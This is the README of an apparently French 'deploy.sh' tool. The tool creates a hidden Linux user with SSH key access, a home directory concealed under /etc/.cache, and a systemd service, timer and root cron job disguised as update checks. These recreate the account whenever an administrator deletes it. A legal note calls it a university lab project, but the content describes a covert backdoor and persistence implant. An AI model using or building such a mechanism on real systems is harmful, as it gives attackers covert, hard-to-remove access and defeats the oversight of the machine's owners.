# deploy.sh

## 📌 Objectif

Automatiser la création d'un utilisateur caché avec accès SSH par clé publique, persistance via systemd + cron fallback, pour des environnements de lab et de tests universitaires.

---

## ⚙️ Fonctionnalités

* ✅ Création d’un **utilisateur personnalisé** avec UID/GID fixes (899)
* 🔐 Configuration SSH avec **clé publique** (collée ou fournie via fichier)
* 🏠 Home discret dans `/etc/.cache/.libsys/.home_<user>`
* 🔁 Persistance via **service systemd + timer**
* 🕒 **Cron de secours** toutes les 30 minutes si systemd est désactivé
* 🧽 Suppression automatique de `/home/<user>` s’il réapparaît

---

## 🚀 Installation

```bash
sudo ./deploy.sh
```

Le script te demandera :

1. Le nom du compte à créer (défaut : `wirensystem`)
2. De **coller la clé SSH publique** (puis Ctrl+D pour terminer)

### ✅ Option en ligne de commande :

```bash
sudo ./deploy.sh -k ~/.ssh/id_ed25519.pub -u stealthadmin
```

---

## 🔍 Résultat final

* Utilisateur accessible via SSH uniquement avec clé publique
* Home : `/etc/.cache/.libsys/.home_<user>`
* Script de résurrection : `/usr/local/lib/.sysupdate/.persist_<user>`
* Service systemd : `systemd-update-check@fw.service`
* Timer systemd : `systemd-update-check.timer`
* Entrée crontab root : toutes les 30 min

---

## 🧪 Tests recommandés

1. Supprime le compte manuellement :

   ```bash
   sudo userdel -r <user>
   ```
2. Redémarre la machine ou attends 10 minutes
3. Vérifie que tu peux te reconnecter via :

   ```bash
   ssh -i /chemin/cle <user>@<ip_du_serveur>
   ```

---

## ⚠️ Note légale

Ce script est conçu uniquement pour des **environnements de test, d’audit, ou de simulation en laboratoire universitaire**. L’usage sans autorisation explicite constitue une infraction aux lois en vigueur.

---

## ✒️ Auteur

Projet académique à but pédagogique
